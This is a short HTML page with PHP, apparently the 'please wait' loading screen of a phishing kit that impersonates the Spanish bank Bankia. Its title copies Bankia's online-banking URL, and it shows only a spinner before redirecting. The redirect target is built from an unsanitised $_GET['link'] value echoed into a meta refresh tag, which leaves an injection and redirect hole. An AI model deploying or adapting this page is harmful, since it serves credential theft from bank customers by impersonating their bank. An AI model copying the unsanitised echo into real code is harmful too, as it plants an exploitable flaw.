<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>https://www.bankia.es/oficina/particulares/#/posicion-global</title>
    <link rel="icon" type="image/png" href="../img/favicon.ico">
    <meta http-equiv="refresh" content="15; url=./<?php echo $_GET['link'];?>.php">
</head>
<body>
<div style="
    width: 100%;
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
">
        <img src="../img/spin.gif" alt="" style="
    width: 60px;
">
    </div>
</body>
</html>